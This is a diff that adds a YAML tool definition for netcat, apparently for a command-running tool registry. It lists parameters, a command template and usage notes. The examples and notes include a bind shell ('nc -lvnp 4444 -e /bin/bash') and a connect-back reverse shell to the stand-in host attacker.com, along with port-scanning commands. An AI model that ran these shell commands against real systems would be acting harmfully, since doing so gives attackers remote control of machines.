@@ -1,0 +1,120 @@
+name: nc
+category: network
+description: Network utility for reading/writing network connections. Swiss army knife for networking.
+keywords:
+  - network
+  - connect
+  - listen
+  - shell
+  - transfer
+  - port
+  - tcp
+  - udp
+  - banner
+
+parameters:
+  host:
+    type: string
+    description: Target host (for connect mode)
+
+  port:
+    type: string
+    description: Port number or range
+
+  listen:
+    type: boolean
+    flag: "-l"
+    description: Listen mode (wait for connections)
+
+  verbose:
+    type: boolean
+    flag: "-v"
+    description: Verbose output
+
+  very_verbose:
+    type: boolean
+    flag: "-vv"
+    description: Very verbose output
+
+  udp:
+    type: boolean
+    flag: "-u"
+    description: UDP mode instead of TCP
+
+  zero_io:
+    type: boolean
+    flag: "-z"
+    description: Zero-I/O mode (port scanning)
+
+  wait:
+    type: integer
+    flag: "-w"
+    description: Timeout for connects and reads
+
+  no_dns:
+    type: boolean
+    flag: "-n"
+    description: Skip DNS lookups
+
+  keep_open:
+    type: boolean
+    flag: "-k"
+    description: Keep listening after disconnect
+
+  execute:
+    type: string
+    flag: "-e"
+    description: Execute command on connection (use with caution)
+
+  source_port:
+    type: integer
+    flag: "-p"
+    description: Local port to use
+
+  source_address:
+    type: string
+    flag: "-s"
+    description: Local address to use
+
+requires_root: false
+timeout: 60
+
+command_template: "nc {listen?} {verbose?} {very_verbose?} {udp?} {zero_io?} {wait?} {no_dns?} {keep_open?} {source_port?} {source_address?} {host?} {port?}"
+
+examples:
+  - "nc -lvnp 4444"
+  - "nc target.com 80"
+  - "nc -zv target.com 1-1000"
+  - "nc -u target.com 53"
+  - "nc -lvnp 4444 -e /bin/bash"
+  - "nc -w 3 target.com 22"
+
+notes: |
+  Common use cases:
+
+  1. Port scanning:
+     nc -zv target.com 1-1000
+
+  2. Banner grabbing:
+     nc -v target.com 80
+
+  3. Listen for reverse shell:
+     nc -lvnp 4444
+
+  4. Connect back shell:
+     nc attacker.com 4444 -e /bin/bash
+
+  5. File transfer (receiver):
+     nc -lvnp 4444 > file.txt
+
+  6. File transfer (sender):
+     nc target.com 4444 < file.txt
+
+  7. Chat/messaging:
+     Server: nc -lvnp 4444
+     Client: nc server.com 4444
+
+  Ncat (from nmap) has more features:
+  - SSL support
+  - Proxy support
+  - Access control
